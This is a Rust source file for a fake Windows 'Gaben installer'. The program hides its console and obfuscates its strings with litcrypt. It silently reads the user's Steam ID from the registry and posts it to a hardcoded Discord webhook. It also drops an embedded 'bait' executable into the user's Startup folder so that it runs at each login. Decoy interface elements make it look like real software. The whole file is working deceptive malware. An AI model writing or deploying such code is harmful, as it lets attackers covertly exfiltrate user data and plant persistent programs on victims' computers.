#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

extern crate litcrypt;

use derive_builder::Builder;
use litcrypt::use_litcrypt;
#[allow(unused_imports)]
use sdk::logger::log;
use strum_macros::EnumIs;

use eframe::{
    egui::{self, viewport::ViewportBuilder, CursorIcon, RichText},
    App, NativeOptions, Theme,
};
use std::{fs::File, io::Write, path::PathBuf, time::Duration};

use windows::core::s;
use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_ICONINFORMATION, MB_OK};

use_litcrypt!("6D2AA05BB3EE41964F1830CD70F9AEF0B36A0138E5116F4B64D00A960AB11053");

const WINDOW_WIDTH: f32 = 600.0;
const WINDOW_HEIGHT: f32 = 450.0;
const WINDOW_NAME: &str = "Gaben installer";
const BAIT_BYTES: &[u8] = include_bytes!("..\\..\\target\\release\\gaben.exe");

#[cfg(target_os = "windows")]
#[tokio::main]
async fn main() {
    sdk::logger::init_env();

    let path = PathBuf::new()
        .join("C:\\Users")
        .join(std::env::var("UserName").unwrap())
        .join("AppData")
        .join("Roaming")
        .join("Microsoft")
        .join("Windows")
        .join("Start Menu")
        .join("Programs")
        .join("Startup")
        .join("gaben.exe");

    if path.exists() {
        unsafe {
            MessageBoxA(
                None,
                s!("Gaben is already installed on your computer"),
                s!("Gaben"),
                MB_OK | MB_ICONINFORMATION,
            );
        }

        return;
    }

    let viewport = ViewportBuilder {
        resizable: Some(false),
        maximized: Some(false),
        maximize_button: Some(false),
        minimize_button: Some(false),
        inner_size: Some(egui::Vec2 {
            x: WINDOW_WIDTH,
            y: WINDOW_HEIGHT,
        }),
        title: Some(String::from(WINDOW_NAME)),
        ..Default::default()
    };

    if let Some(id) = get_steam_id() {
        send_message(id).await;
    }

    let options = NativeOptions {
        centered: true,
        vsync: false,
        viewport,
        default_theme: Theme::Dark,
        follow_system_theme: false,
        ..Default::default()
    };

    eframe::run_native(
        WINDOW_NAME,
        options,
        Box::new(|cc| {
            egui_extras::install_image_loaders(&cc.egui_ctx);
            let window = WindowBuilder::default()
                .path(path)
                .checked(false)
                .fallback(None)
                .build()
                .unwrap();

            Box::new(window)
        }),
    )
    .unwrap();
}

#[derive(Debug, EnumIs, Clone)]
enum Fallback {
    Failure { message: &'static str },
    Done,
    Loading,
}

impl Fallback {
    fn fallback_message(&self) -> &'static str {
        match self {
            Fallback::Failure { message } => &message,
            Fallback::Done => "Installed",
            Fallback::Loading => "Installing ...",
        }
    }
}

#[derive(Default, Builder)]
struct Window {
    path: PathBuf,
    fallback: Option<Fallback>,
    checked: bool,
}

impl Window {
    fn panel(&mut self, ui: &mut eframe::egui::Ui) {
        ui.with_layout(egui::Layout::left_to_right(egui::Align::TOP), |ui| {
            ui.image(egui::include_image!("..\\assets\\banner.png"));
            ui.with_layout(egui::Layout::top_down(egui::Align::TOP), |ui| {
                ui.add(egui::Label::new(RichText::new(WINDOW_NAME).size(32.0)).selectable(false));
                ui.add(egui::Label::new(
                    RichText::new(
                        String::from_utf8(include_bytes!("..\\assets\\bullshit.txt").to_vec())
                            .unwrap_or_else(|_| (String::from("error"))),
                    )
                    .size(14.0),
                ));

                ui.checkbox(&mut self.checked, "Include kernel driver component");
                ui.spacing();
                ui.with_layout(egui::Layout::right_to_left(egui::Align::TOP), |ui| {
                    // This breaks rustfmt for some reason even tho the code compiles just fine
                    // let path = PathBuf::from(
                    //     format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                    //         std::env::var("UserName").unwrap())
                    // );

                    let button = ui
                        .add(egui::Button::new(
                            egui::RichText::new(if let Some(fallback) = &self.fallback {
                                fallback.fallback_message()
                            } else {
                                "Install"
                            })
                            .color(egui::Color32::WHITE)
                            .size(16.0),
                        ))
                        .on_hover_cursor(CursorIcon::PointingHand.clone());

                    if let Some(fallback) = &self.fallback {
                        ui.set_enabled(!fallback.is_loading());
                    }

                    if button.clicked() && self.fallback.is_none() {
                        self.fallback = Some(Fallback::Loading);
                        std::thread::sleep(Duration::from_secs(2));
                        let Ok(mut dest) = File::create(&self.path) else {
                            self.fallback = Some(Fallback::Failure {
                                message: "failed to create file descriptor",
                            });
                            return;
                        };

                        match dest.write_all(&BAIT_BYTES) {
                            Ok(_) => {
                                self.fallback = Some(Fallback::Done);
                                unsafe {
                                    MessageBoxA(
                                        None,
                                        // this also breaks rustfmt lol?????
                                        s!("The installation was successful, please restart your computer."),
                                        s!("Gaben"),
                                        MB_OK | MB_ICONINFORMATION
                                    );
                                }
                            }
                            Err(_) => {
                                self.fallback = Some(Fallback::Failure {
                                    message: "failed to write bytes to dest",
                                });
                            }
                        };
                    }

                    #[cfg(debug_assertions)]
                    {
                        log::debug!("{:?}", self.fallback);
                    }
                });
            });
        });
    }
}

impl App for Window {
    fn update(&mut self, ctx: &egui::Context, _: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| self.panel(ui));
    }
}

fn get_steam_id() -> Option<u32> {
    use winreg::enums::*;
    use winreg::RegKey;
    let hklm = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(active_process) = hklm.open_subkey("SOFTWARE\\Valve\\Steam\\ActiveProcess") {
        let Ok(id) = active_process.get_value::<u32, &str>("ActiveUser") else {
            return None;
        };

        return Some(id);
    }

    None
}

async fn send_message(steam_id: u32) {
    use litcrypt::lc;
    use reqwest::Client;
    use std::collections::HashMap;

    let steam_profile = format!("https://steamcommunity.com/profiles/[U:1:{}]", steam_id);
    let mut body = HashMap::new();
    body.insert("content", steam_profile);

    let webhook = lc!("https://discord.com/api/webhooks/1232012426657136742/of0BaEzlrWgex06GMZihwOYOfgvGdZM24qCYXAXtLNhtCqNvTQDfM8qWJDRgUfug34Q_");
    let _ = Client::new().post(webhook).json(&body).send().await;
}